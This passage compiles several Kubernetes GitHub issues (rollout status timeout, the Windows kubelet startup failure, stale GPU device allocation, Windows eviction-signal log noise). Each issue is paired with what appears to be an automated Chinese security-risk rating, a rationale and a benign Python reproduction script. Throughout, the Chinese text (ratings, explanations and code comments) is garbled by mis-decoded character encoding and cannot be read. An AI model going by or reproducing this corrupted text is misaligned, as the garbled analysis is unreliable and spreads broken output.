        # ä½¿ç”¨ force=True è¡¨ç¤ºå¼ºåˆ¶è¦†ç›–å†²çª
        cm1 = v1.patch_namespaced_config_map(
            name=cm_name,
            namespace=namespace,
            body=cm_apply_mgr1,
            field_manager="mgr1",
            force=True
        )
        print("mgr1 åº”ç”¨æˆåŠŸï¼ŒConfigMap data:", cm1.data)
    except ApiException as e:
        print("mgr1 åº”ç”¨æ—¶å‡ºé”™:", e)
        return

    # æ¨¡æ‹Ÿ mutating admission æˆ– defaulting å¤„ç†ï¼Œå°† f1 ä¿®æ”¹ä¸º "z"
    try:
        # è¯»å–å½“å‰ ConfigMap
        current_cm = v1.read_namespaced_config_map(cm_name, namespace)
        # æ¨¡æ‹Ÿå…¥ç«™å˜æ›´ï¼šåå°å°† f1 ä¿®æ”¹ä¸º "z"
        if current_cm.data is None:
            current_cm.data = {}
        current_cm.data["f1"] = "z"
        # ä½¿ç”¨ replace å®Œæˆæ¨¡æ‹Ÿå˜æ›´
        updated_cm = v1.replace_namespaced_config_map(cm_name, namespace, current_cm)
        print("æ¨¡æ‹Ÿå˜æ›´åï¼ŒConfigMap data:", updated_cm.data)
    except ApiException as e:
        print("æ¨¡æ‹Ÿå˜æ›´æ—¶å‡ºé”™:", e)
        return

    # mgr2 å°è¯•ä½¿ç”¨ä¸ mgr1 ç›¸åŒçš„é…ç½®ï¼ˆf1: "x"ï¼‰è¿›è¡Œ Server Side Apply
    cm_apply_mgr2 = {
        "apiVersion": "v1",
        "kind": "ConfigMap",
        "metadata": {
            "name": cm_name
        },
        "data": {
            "f1": "x"
        }
    }
    try:
        cm2 = v1.patch_namespaced_config_map(
            name=cm_name,
            namespace=namespace,
            body=cm_apply_mgr2,
            field_manager="mgr2",
            force=False  # ä¸å¼ºåˆ¶è¦†ç›–ï¼Œä½¿å†²çªæ›´æ˜æ˜¾
        )
        print("mgr2 åº”ç”¨æˆåŠŸï¼ŒConfigMap data:", cm2.data)
    except ApiException as e:
        print("mgr2 åº”ç”¨æ—¶å‘ç”Ÿå†²çª:", e)
    
    print("è„šæœ¬æ‰§è¡Œå®Œæ¯•ã€‚")

# ç›´æ¥è°ƒç”¨ main å‡½æ•°æ‰§è¡Œ
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

1. è„šæœ¬é¦–å…ˆåŠ è½½é»˜è®¤çš„ kubeconfig æ–‡ä»¶ï¼Œå¹¶åˆå§‹åŒ– Kubernetes CoreV1Api å®¢æˆ·ç«¯ã€‚
2. ä¸ºé¿å…å·²æœ‰å†²çªèµ„æºå¯¹æµ‹è¯•äº§ç”Ÿå½±å“ï¼Œè„šæœ¬å°è¯•åˆ é™¤åç§°ä¸ºâ€œssa-late-default-demoâ€çš„ ConfigMapï¼ˆå¦‚æœå­˜åœ¨ï¼‰ã€‚
3. æ¨¡æ‹Ÿåœºæ™¯ä¸­ï¼Œé¦–å…ˆç”± mgr1 é€šè¿‡ Server Side Apply åº”ç”¨ä¸€ä¸ªåŒ…å« data å­—æ®µ { "f1": "x" } çš„ ConfigMapï¼Œä½¿ç”¨ field_manager å‚æ•°æ ‡è¯†å‡ºé…ç½®çš„æ‰€æœ‰è€…ã€‚
4. éšåï¼Œè„šæœ¬æ¨¡æ‹Ÿå…¥ç«™å˜æ›´/é»˜è®¤å€¼å¤„ç†ï¼ˆä¾‹å¦‚é€šè¿‡ mutating admission æˆ–ç­–ç•¥é»˜è®¤ï¼‰ï¼Œå°† ConfigMap ä¸­çš„ f1 å­—æ®µæ”¹ä¸º "z"ã€‚è¿™ä¸€æ­¥ä½¿ç”¨å¸¸è§„çš„ replace æ“ä½œæ¥æ¨¡æ‹Ÿé»˜è®¤å€¼æˆ–è¿œç¨‹å˜æ›´æ“ä½œã€‚
5. æœ€åï¼Œmgr2 ä¹Ÿå°è¯•ä»¥ç›¸åŒçš„é…ç½®ï¼ˆf1: "x"ï¼‰åº”ç”¨è¯¥ ConfigMapï¼Œæ­¤æ—¶ç”±äºåå°å·²æœ‰å˜æ›´ï¼ˆf1 å€¼ä¸º "z"ï¼‰è€Œå¯¼è‡´æ‰€æœ‰æƒå†²çªã€‚æ•è·å¹¶æ‰“å°å†²çªé”™è¯¯ã€‚
6. è„šæœ¬è®¾ç½®äº†è¶…æ—¶æœºåˆ¶ï¼Œç¡®ä¿è¶…è¿‡2åˆ†é’Ÿåè‡ªåŠ¨é€€å‡ºï¼Œä¸”å…¨éƒ¨æµç¨‹é€šè¿‡ Python çš„ Kubernetes å®¢æˆ·ç«¯åº“å®Œæˆï¼Œæ— éœ€è°ƒç”¨å¤–éƒ¨å‘½ä»¤ã€‚

è¯¥å¤ç°è„šæœ¬ç”¨äºæœ¬åœ°æµ‹è¯•å’Œç ”ç©¶ï¼Œæ—¨åœ¨æ¨¡æ‹Ÿ Issue ä¸­æè¿°çš„å†²çªç°è±¡ï¼Œå¹¶ä¸æ„æˆå¯¹ç”Ÿäº§ç¯å¢ƒçš„çœŸæ­£æ”»å‡»æˆ–ç ´åã€‚æ•´ä¸ªé—®é¢˜æ˜¯èµ„æºé…ç½®ç®¡ç†è¯­ä¹‰ä¸Šçš„ä¸ä¸€è‡´ï¼Œä¸å®‰å…¨æ”»å‡»æ‰‹æ®µå¹¶æ— ç›´æ¥å…³è”ï¼Œå› æ­¤é£é™©è¯„çº§åˆ¤å®šä¸ºâ€œä¸æ¶‰åŠâ€ã€‚

---


## Issue #129959 --timeout argument ignored in rollout status

- Issue é“¾æ¥ï¼š[#129959](https://github.com/kubernetes/kubernetes/issues/129959)

### Issue å†…å®¹

#### What happened?

Setting a timeout argument to '20m' in `kubectl rollout status` doesn't do anything. See attached screenshot from Jenkins pipeline, showing a 10min timeout even though the timeout was set to 20 minutes. 

![Image](https://github.com/user-attachments/assets/bdf1c2ef-f147-4b77-b259-d59cb4bcf402)

Here's the command output showing it timed out:

```console
14:08:47  + kubectl -n dev rollout status deploy/stt-service '--timeout=20m'
14:08:47  Waiting for deployment "stt-service" rollout to finish: 1 old replicas are pending termination...
14:18:54  error: deployment "stt-service" exceeded its progress deadline
```

#### What did you expect to happen?

I expected the timeout of the command to change as per [the docs](https://kubernetes.io/docs/reference/kubectl/generated/kubectl_rollout/kubectl_rollout_status/). 

#### How can we reproduce it (as minimally and precisely as possible)?

Using s ervice which takes more than 10 minutes to be ready: 
kubectl rollout status ${serviceName} --timeout=20m

Then check how long the command waits before exiting. 

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.5
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.8-gke.1162000
```

</details>


#### Cloud provider

<details>
GKE
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ issue æè¿°çš„é—®é¢˜ä¸ kubectl rollout status å‘½ä»¤ä¸­ --timeout å‚æ•°æ— æ•ˆæœ‰å…³ï¼Œå±äºå‘½ä»¤è¡Œä¸ºçš„ Bugï¼Œè€Œéå®‰å…¨æ¼æ´ã€‚é—®é¢˜æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§ç¼ºé™·ï¼Œä¸å­˜åœ¨å‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ã€ææƒç­‰å®‰å…¨å½±å“ï¼Œä¹Ÿä¸æ¶‰åŠæ•æ„Ÿå‡­è¯çš„æ³„éœ²æˆ–ä¸å½“é…ç½®ç­‰å®‰å…¨é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import time
from datetime import datetime, timedelta
from kubernetes import client, config, watch

def main():
    # åŠ è½½é»˜è®¤ kubeconfig
    try:
        config.load_kube_config()
    except Exception as e:
        print("åŠ è½½ kubeconfig å¤±è´¥ï¼š", e)
        return

    # å¯é…ç½®çš„å‘½åç©ºé—´ã€Deployment åç§°å’Œè¶…æ—¶æ—¶é—´
    # æ³¨ï¼šè¿™é‡Œè¶…æ—¶æ—¶é—´ä»…ä¸ºç¤ºä¾‹ï¼ŒçœŸå®ç¯å¢ƒä¸‹åº”ä½¿ç”¨è¾ƒé•¿æ—¶é•¿ï¼ˆä¾‹å¦‚20åˆ†é’Ÿï¼‰ï¼Œä½†
    # ä¸ºäº†ç¡®ä¿è„šæœ¬åœ¨2åˆ†é’Ÿå†…é€€å‡ºï¼Œæˆ‘ä»¬å°†æ¼”ç¤ºè¶…æ—¶æ—¶é—´è®¾ç½®ä¸º120ç§’
    namespace = "dev"
    deployment_name = "stt-service"
    # æœ¬ç¤ºä¾‹è¶…æ—¶è®¾ç½®ä¸º120ç§’ï¼ˆæ¨¡æ‹Ÿ20må‚æ•°ï¼Œä½†ä¸ºæµ‹è¯•ç›®çš„ç¼©çŸ­ï¼‰
    timeout_seconds = 120

    apps_v1 = client.AppsV1Api()
    start_time = datetime.now()
    deadline = start_time + timedelta(seconds=timeout_seconds)

    print("å¼€å§‹æ£€æµ‹ deployment '{}' åœ¨å‘½åç©ºé—´ '{}' ä¸­çš„ rollout çŠ¶æ€...".format(deployment_name, namespace))
    w = watch.Watch()
    
    try:
        # è§‚å¯Ÿ deployment çš„å˜åŒ–ï¼Œæ³¨æ„ watch çš„ timeout_seconds å‚æ•°ä»…ä¿è¯è§‚å¯Ÿæ—¶æ®µå†…çš„æµé‡
        for event in w.stream(apps_v1.read_namespaced_deployment_status,
                              name=deployment_name,
                              namespace=namespace,
                              timeout_seconds=timeout_seconds):
            current_time = datetime.now()
            # æ£€æŸ¥æ˜¯å¦è¶…è¿‡é¢„è®¾æ€»è¶…æ—¶æ—¶é—´
            if current_time > deadline:
                print("æ€»ç­‰å¾…æ—¶é—´è¶…è¿‡è®¾å®šè¶…æ—¶ï¼ˆ{}ç§’ï¼‰ï¼Œé€€å‡ºç›‘æ§".format(timeout_seconds))
                w.stop()
                break

            deployment = event['object']
            status = deployment.status
            available_replicas = status.available_replicas if status.available_replicas is not None else 0
            desired_replicas = deployment.spec.replicas

            print("[{}] available_replicas = {} / desired_replicas = {}".format(
                datetime.now().strftime("%H:%M:%S"),
                available_replicas, desired_replicas))

            # å½“ Available replicas æ•°é‡è¾¾åˆ°æœŸæœ›å€¼æ—¶è®¤ä¸º rollout å®Œæˆ
            if available_replicas >= desired_replicas:
                print("Deployment å·² rollout å®Œæˆ")
                w.stop()
                break

    except Exception as e:
        print("ç›‘æ§è¿‡ç¨‹ä¸­å‡ºç°å¼‚å¸¸ï¼š", e)

    total_runtime = (datetime.now() - start_time).total_seconds()
    # åˆ¤æ–­ rollout æ˜¯å¦åœ¨è¶…æ—¶æ—¶é—´å†…å®Œæˆ
    if total_runtime >= timeout_seconds:
        print("error: deployment \"{}\" exceeded its progress deadline".format(deployment_name))
    else:
        print("Total runtime: {:.2f}ç§’".format(total_runtime))

# ç›´æ¥è°ƒç”¨ main å‡½æ•°æ‰§è¡Œ
main()
```


---


## Issue #129952 Kubelet 1.31.0/1.31.1 cannot start on Windows

- Issue é“¾æ¥ï¼š[#129952](https://github.com/kubernetes/kubernetes/issues/129952)

### Issue å†…å®¹

#### What happened?

We have a mixed Linux/Windows cluster with eight Linux nodes and, for now, a single Windows node. The cluster is a "bare metal" cluster running on VMware hosts provisioned using `kubeadm`.

Since upgrading from 1.30 to 1.31, the kubelet cannot start on Windows anymore. Initially, we upgraded to 1.31.0 and experienced the problem; after reading #126965, we tried upgrading to 1.31.1, but the problem persists.

The `kubelet.err.log` on the Windows Server 2022 host reports:

```console
run.go:72] "command failed" err="failed to run Kubelet: protocol \"unix\" not supported"
```

This happens with version 1.31.0 as well as 1.31.1 of the Windows kubelet version.

#### What did you expect to happen?

We expected the upgrade to be as smooth as it used to be.

#### How can we reproduce it (as minimally and precisely as possible)?

I assume it would be necessary to setup a mixed cluster running 1.30.X and attempt an upgrade to 1.31.0.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.4
Kustomize Version: v5.4.2
Server Version: v1.31.1
```

</details>


#### Cloud provider

<details>
Bare metal cluster running on VMware VMs - provisioned using kubeadm.
</details>


#### OS version

<details>

```console
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.5 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.5 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy

$ uname -a
Linux ddkcphdswkube02 5.15.0-91-generic #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
BuildNumber  Caption                                 OSArchitecture  Version
20348        Microsoft Windows Server 2022 Standard  64-bit          10.0.20348
```

</details>


#### Install tools

<details>
Kubeadm
</details>


#### Container runtime (CRI) and version (if applicable)




#### Related plugins (CNI, CSI, ...) and versions (if applicable)




### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æè¿°çš„æ˜¯åœ¨ Kubernetes å‡çº§åˆ° 1.31.0/1.31.1 åï¼ŒWindows å¹³å°ä¸Šçš„ kubelet æ— æ³•å¯åŠ¨ï¼ŒæŠ¥é”™ä¿¡æ¯ä¸º "protocol \"unix\" not supported"ã€‚ç»è¿‡åˆ†æï¼Œè¯¥é—®é¢˜ä¸»è¦æ˜¯ç”±äº Windows å¹³å°ä¸æ”¯æŒ Unix åŸŸå¥—æ¥å­—å¯¼è‡´çš„å…¼å®¹æ€§ bugï¼Œå¹¶éç”±äºä¸å½“çš„é…ç½®ã€å‡­è¯æ³„éœ²ã€å‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸æˆ–ææƒç­‰å®‰å…¨æ¼æ´å¼•èµ·ï¼Œä»å®‰å…¨è§’åº¦çœ‹ï¼Œè¯¥ Issue å¹¶ä¸ä¼šå¯¼è‡´æ”»å‡»è€…åˆ©ç”¨æ¼æ´è·å–æƒé™æˆ–é€ æˆæ•°æ®æ³„éœ²ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
#!/usr/bin/env python3
"""
è¯´æ˜ï¼šæ­¤è„šæœ¬ç”¨äºæ¨¡æ‹Ÿæ£€æŸ¥ Kubernetes é›†ç¾¤ä¸­ Windows èŠ‚ç‚¹æ‰€ä½¿ç”¨çš„ kubelet ç‰ˆæœ¬ï¼Œ
å½“æ£€æµ‹åˆ°ç‰ˆæœ¬ä¸º v1.31.0 æˆ– v1.31.1 æ—¶ï¼Œæç¤ºå­˜åœ¨ç±»ä¼¼æŠ¥é”™ï¼ˆprotocol "unix" not supportedï¼‰çš„é—®é¢˜ã€‚
è¯¥è„šæœ¬ä»…ç”¨äºå¸®åŠ©ç”¨æˆ·ç¡®è®¤é›†ç¾¤ä¸­æ˜¯å¦å­˜åœ¨å—æ­¤å½±å“çš„ Windows èŠ‚ç‚¹ï¼Œå¹¶éåˆ©ç”¨å®é™…æ¼æ´ã€‚
"""

import sys
import time
import threading
from kubernetes import client, config

def main():
    try:
        # ä»é»˜è®¤ä½ç½®åŠ è½½ kubeconfig
        config.load_kube_config()
    except Exception as e:
        print("åŠ è½½ kubeconfig å¤±è´¥ï¼Œè¯·ç¡®è®¤é»˜è®¤ä½ç½®æœ‰æ­£ç¡®çš„ kubeconfig æ–‡ä»¶ã€‚é”™è¯¯ä¿¡æ¯ï¼š", e)
        sys.exit(1)

    v1 = client.CoreV1Api()

    try:
        node_list = v1.list_node().items
    except Exception as e:
        print("è·å–èŠ‚ç‚¹åˆ—è¡¨å¤±è´¥ï¼Œé”™è¯¯ä¿¡æ¯ï¼š", e)
        sys.exit(1)

    affected = False
    for node in node_list:
        labels = node.metadata.labels or {}
        os_label = labels.get("kubernetes.io/os", "").lower()
        if os_label == "windows":
            kubelet_version = node.status.node_info.kubelet_version
            if kubelet_version in ["v1.31.0", "v1.31.1"]:
                print(f"è­¦å‘Šï¼šWindows èŠ‚ç‚¹ '{node.metadata.name}' ä½¿ç”¨ kubelet ç‰ˆæœ¬ {kubelet_version}ï¼Œå¯èƒ½ä¼šå‡ºç°å¯åŠ¨å¤±è´¥é”™è¯¯ï¼šprotocol \"unix\" not supported")
                affected = True

    if not affected:
        print("æœªæ£€æµ‹åˆ°å—å½±å“çš„ Windows èŠ‚ç‚¹ã€‚")
    # ç­‰å¾…å‡ ç§’åé€€å‡ºï¼Œé¿å…ç«‹å³é€€å‡º
    time.sleep(3)

def run_with_timeout(func, timeout):
    thread = threading.Thread(target=func)
    thread.start()
    thread.join(timeout)
    if thread.is_alive():
        print("è„šæœ¬æ‰§è¡Œè¶…æ—¶ï¼Œé€€å‡ºã€‚")
        sys.exit(1)

# æ‰§è¡Œä¸»ç¨‹åºï¼Œè¶…æ—¶æ—¶é—´è®¾ç½®ä¸º 120 ç§’
run_with_timeout(main, 120)
```


---


## Issue #130145 Pod Allocate failed due to requested number of devices unavailable for nvidia.com/gpu. Requested:1, Available: 0, which is unexpected

- Issue é“¾æ¥ï¼š[#130145](https://github.com/kubernetes/kubernetes/issues/130145)

### Issue å†…å®¹

#### What happened?

Recently, we encountered an intermittent issue that occurs approximately once a week. The error event is as follows:

```
...
Status:              Failed
Reason:            UnexpectedAdmissionError
Message:         Pod Allocate failed due to requested number of devices unavailable for nvidia.com/gpu. Requested:1, Available: 0, which is unexpected
```
After this error occurs, pods scheduled to the node persistently report the UnexpectedAdmissionError, and restarting the kubelet resolves the issue.

**Context:**
- We use GPU scheduling with jobs that request GPU resources (multi-GPU or single-GPU),each pod includes an init container and a app container.
- In abnormal scenarios, when a pod fails to start (status: Failed), it is forcibly deleted (`kubectl delete pod --force`).

**Analysis:**
After adding debug log, we observed that the `m.allocatedDevices` (a data structure tracking device allocations) contained stale data, causing devices to remain "occupied" indefinitely.

We analyzed the code and found that `m.allocatedDevices` is reset during pod allocation. However, the reset logic is skipped under a specific condition:

When activePods  matches `m.podDevices.pods()` (the list of pods tracked by the device manager), the code does not reset `m.allocatedDevices`.

By adding debug logs, we confirmed that when the kubelet repeatedly reports UnexpectedAdmissionError, the condition `len(podsToBeRemoved) <= 0` (no pods marked for removal) prevents the update of `m.allocatedDevices`. This leaves stale data in `m.allocatedDevices`, leading to incorrect resource allocation.

https://github.com/kubernetes/kubernetes/blob/e62ce1c9db2dadf225f37fe3dc943b64dc251950/pkg/kubelet/cm/devicemanager/manager.go#L551-L570

After analyzing up to this point, I still haven't identified the root cause of why the kubelet enters this state. Any insights would be greatly appreciated. Thanks in advance!



#### What did you expect to happen?

Pods can run normally on the node without reporting the `UnexpectedAdmissionError.`



#### How can we reproduce it (as minimally and precisely as possible)?

Create a large number of jobs, each requesting single-GPU or multi-GPU resources and including an init container and an app container. Some of these jobs fail immediately after starting and are forcibly deleted.



#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
v1.29.3

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ issue æŠ¥å‘Šæè¿°çš„æ˜¯ kubelet åœ¨åˆ†é… GPU è®¾å¤‡æ—¶ï¼Œç”±äºè®¾å¤‡ç®¡ç†æ¨¡å—ä¸­ trackingï¼ˆm.allocatedDevicesï¼‰å­˜åœ¨é™ˆæ—§æ•°æ®ï¼ˆstale dataï¼‰å¯¼è‡´èµ„æºåˆ†é…å¼‚å¸¸çš„é—®é¢˜ã€‚ä¸»è¦è¡¨ç°ä¸ºå½“æŸäº› pod å› å¯åŠ¨å¤±è´¥è¢«å¼ºåˆ¶åˆ é™¤åï¼Œæœªèƒ½åŠæ—¶æ¸…é™¤è®¾å¤‡åˆ†é…è®°å½•ï¼Œå¯¼è‡´åç»­å¯¹ GPU çš„åˆ†é…åˆ¤æ–­å‡ºç°é”™è¯¯ã€‚è¿™å±äºèµ„æºè°ƒåº¦å’Œè®¾å¤‡ç®¡ç†é€»è¾‘ä¸Šçš„ bugï¼Œè€Œéå®‰å…¨æ¼æ´ï¼Œå…¶å½±å“èŒƒå›´ä¸»è¦åœ¨èµ„æºè€—å°½å’Œ Pod è°ƒåº¦å¤±è´¥ï¼Œä¸å­˜åœ¨æœªç»æˆæƒæ‰§è¡Œä»»æ„ä»£ç ã€å‘½ä»¤æ‰§è¡Œã€ææƒã€å®¹å™¨é€ƒé€¸ç­‰å®‰å…¨é—®é¢˜ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import time

# å®šä¹‰ä¸€ä¸ªæ¨¡æ‹ŸGPUè®¾å¤‡ç®¡ç†çš„ç±»
class DeviceManager:
    def __init__(self):
        # æ¨¡æ‹Ÿè®°å½•å·²åˆ†é…è®¾å¤‡æƒ…å†µï¼Œkeyä¸ºèµ„æºåç§°ï¼ˆè¿™é‡Œä¸º'nvidia.com/gpu'ï¼‰ï¼Œvalueä¸ºå·²åˆ†é…æ•°é‡
        self.allocated_devices = {}
        # æ¨¡æ‹Ÿè®°å½•æ¯ä¸ªpodæ‰€å ç”¨çš„è®¾å¤‡æ•°ï¼Œkeyä¸ºpodåç§°ï¼Œvalueä¸ºè®¾å¤‡æ•°
        self.pod_devices = {}

    def allocate_devices(self, pod_name, requested):
        # æ¨¡æ‹Ÿå®é™…åªæœ‰1ä¸ªGPUè®¾å¤‡å¯ç”¨ï¼Œè‹¥å·²åˆ†é…ï¼Œåˆ™availableä¸º0
        available = 1 if self.allocated_devices.get('nvidia.com/gpu', 0) == 0 else 0
        if available < requested:
            # è§¦å‘åˆ†é…å¤±è´¥æƒ…æ™¯ï¼šç”±äºå¯ç”¨è®¾å¤‡ä¸è¶³ï¼ŒæŠ›å‡ºå¼‚å¸¸
            raise Exception(
                "Pod Allocate failed due to requested number of devices unavailable for nvidia.com/gpu. "
                f"Requested:{requested}, Available:{available}, which is unexpected"
            )
        else:
            # æˆåŠŸåˆ†é…è®¾å¤‡
            self.allocated_devices['nvidia.com/gpu'] = requested
            self.pod_devices[pod_name] = requested
            print(f"Allocated {requested} GPU for {pod_name}")

    def cleanup(self, active_pods):
        # æ¨¡æ‹Ÿæ¸…ç†å·²åˆ é™¤podçš„è®¾å¤‡åˆ†é…
        pods_to_remove = [pod for pod in self.pod_devices if pod not in active_pods]
        # å½“æ²¡æœ‰podè¢«æ ‡è®°ä¸ºéœ€è¦æ¸…ç†æ—¶ï¼Œè·³è¿‡æ¸…ç†åŠ¨ä½œï¼Œå¯¼è‡´stale dataçš„æ®‹ç•™
        if len(pods_to_remove) <= 0:
            print("Cleanup skipped: No pods marked for removal; stale data remains in allocated_devices.")
        else:
            for pod in pods_to_remove:
                print(f"Cleaning up device allocation for {pod}")
                self.allocated_devices.pop('nvidia.com/gpu', None)
                self.pod_devices.pop(pod, None)

def main():
    dm = DeviceManager()
    
    # åˆå§‹çŠ¶æ€ï¼špod1æ­£å¸¸ç”³è¯·GPUèµ„æº
    active_pods = ['pod1']
    try:
        dm.allocate_devices('pod1', 1)
    except Exception as err:
        print("Allocation error for pod1:", err)

    # æ¨¡æ‹Ÿpod1å‡ºç°é”™è¯¯åè¢«å¼ºåˆ¶åˆ é™¤ï¼Œä½†ç”±äºactive_podsæœªæ›´æ–°ï¼Œcleanupæ“ä½œè·³è¿‡ï¼Œ
    # å¯¼è‡´m.allocatedDevicesä¸­ä»ä¿ç•™pod1çš„åˆ†é…è®°å½•ï¼ˆstale dataï¼‰
    print("\nSimulating forced deletion scenario where pod1 is failed but not removed from active_pods:")
    dm.cleanup(active_pods)
    
    # å°è¯•ä¸ºæ–°podï¼ˆpod2ï¼‰ç”³è¯·GPUï¼Œç”±äºstaledè®°å½•å­˜åœ¨ï¼Œåˆ†é…å°†å¤±è´¥ï¼Œè§¦å‘å¼‚å¸¸
    try:
        print("\nAttempting to allocate GPU for pod2:")
        dm.allocate_devices('pod2', 1)
    except Exception as err:
        print("Allocation error for pod2:", err)

    # ç­‰å¾…åé€€å‡ºï¼Œç¡®ä¿è„šæœ¬æ‰§è¡Œæ—¶é—´åœ¨è§„å®šèŒƒå›´å†…
    time.sleep(1)
    print("\nScript completed.")

# ç›´æ¥æ‰§è¡Œmainå‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

å¤ç°è„šæœ¬ä¸­æ„é€ äº†ä¸€ä¸ªç®€å•çš„ DeviceManager ç±»ï¼Œç”¨äºæ¨¡æ‹Ÿ kubelet ä¸­è®¾å¤‡åˆ†é…çš„æ ¸å¿ƒé€»è¾‘ã€‚è„šæœ¬æµç¨‹å¦‚ä¸‹ï¼š
1. pod1 æˆåŠŸåˆ†é…åˆ° GPU èµ„æºï¼Œè®°å½•åœ¨ allocated_devices ä¸ pod_devices ä¸­ã€‚
2. æ¨¡æ‹Ÿ pod1 å¼‚å¸¸åè¢«å¼ºåˆ¶åˆ é™¤ï¼Œä½†ç”±äº active_pods åˆ—è¡¨æœªæ›´æ–°ï¼ˆä¾ç„¶åŒ…å« pod1ï¼‰ï¼Œè°ƒç”¨ cleanup() æ—¶ä¸ä¼šæ¸…ç†å¯¹åº”çš„èµ„æºè®°å½•ï¼Œä»è€Œç•™ä¸‹äº† stale dataã€‚
3. å½“å°è¯•ä¸ºæ–°åˆ›å»ºçš„ pod2 åˆ†é… GPU æ—¶ï¼Œç”±äºç³»ç»Ÿé”™è¯¯åœ°è®¤ä¸º GPU å·²è¢«å ç”¨ï¼Œå¯¼è‡´åˆ†é…å¤±è´¥å¹¶æŠ›å‡ºå¼‚å¸¸ã€‚

ä»å®‰å…¨é£é™©è§’åº¦æ¥çœ‹ï¼Œæ­¤é—®é¢˜å±äºèµ„æºç®¡ç†é€»è¾‘é”™è¯¯ï¼Œå¹¶æ²¡æœ‰å¼•å…¥å¯ä¾›æ”»å‡»è€…åˆ©ç”¨çš„æ¼æ´ï¼Œä¸å­˜åœ¨å‘½ä»¤æ‰§è¡Œã€ææƒæˆ–å®¹å™¨é€ƒé€¸ç­‰é«˜é£é™©å®‰å…¨é—®é¢˜ï¼Œå› æ­¤é£é™©è¯„çº§åˆ¤æ–­ä¸ºâ€œä¸æ¶‰åŠâ€ã€‚è¯¥å¤ç°è„šæœ¬ä»…ç”¨äºæ¨¡æ‹Ÿé—®é¢˜å‡ºç°çš„åœºæ™¯ï¼Œä»¥ä¾›å¼€å‘è€…è°ƒè¯•å’Œå®šä½é—®é¢˜ï¼Œç¬¦åˆç ”ç©¶å’Œæœ¬åœ°æµ‹è¯•çš„è¦æ±‚ã€‚

---


## Issue #130142 Windows - eviction manager:  no observation found for eviction signal `containerfs.inodesFree`

- Issue é“¾æ¥ï¼š[#130142](https://github.com/kubernetes/kubernetes/issues/130142)

### Issue å†…å®¹

#### What happened?

 I noticed the v1.32.1 Kubelet on Windows, logs very frequently the following entries for `containerfs.inodesFree` signal which is not supported on Windows, it also contribute to a larger log file. 

```
I0213 04:51:38.888080    1532 helpers.go:940] "Eviction manager: no observation found for eviction signal" signal="containerfs.inodesFree"
I0213 04:51:38.888080    1532 helpers.go:940] "Eviction manager: no observation found for eviction signal" signal="containerfs.inodesFree"
```

Similar issue was reported before for nodefs.inodesFree signal: 
- https://github.com/kubernetes/kubernetes/issues/73792
- https://github.com/kubernetes/kubernetes/issues/66088

 and addressed by @feiskyer on 
- https://github.com/kubernetes/kubernetes/pull/67709



The `containerfs.inodesFree` issue was also reported in https://github.com/kubernetes/kubernetes/issues/73792#issuecomment-2513956582



#### What did you expect to happen?

containerfs.inodesFree is not supported for Windows (Linux only) [1]. The missing observation log should not appear on Windows.



[1] https://kubernetes.io/docs/concepts/scheduling-eviction/node-pressure-eviction/#eviction-signals

#### How can we reproduce it (as minimally and precisely as possible)?

Deployed a cluster with v1.32.1 kubelet, configure Windows nodes and run Windows workloads. Check the kubelet logs in the Windows node; the `Eviction manager: no observation found for eviction signal` event appears  very frequently for the `containerfs.inodesFree`  signal.

#### Anything else we need to know?


Effective kubeletconfig
```
{
  "kubeletconfig": {
    "enableServer": true,
    "podLogsDir": "/var/log/pods",
    "syncFrequency": "1m0s",
    "fileCheckFrequency": "20s",
    "httpCheckFrequency": "20s",
    "address": "0.0.0.0",
    "port": 10250,
    "rotateCertificates": true,
    "serverTLSBootstrap": true,
    "authentication": {
      "x509": {
        "clientCAFile": "C:\\k\\kubelet-ca.crt"
      },
      "webhook": {
        "enabled": true,
        "cacheTTL": "2m0s"
      },
      "anonymous": {
        "enabled": false
      }
    },
    "authorization": {
      "mode": "Webhook",
      "webhook": {
        "cacheAuthorizedTTL": "5m0s",
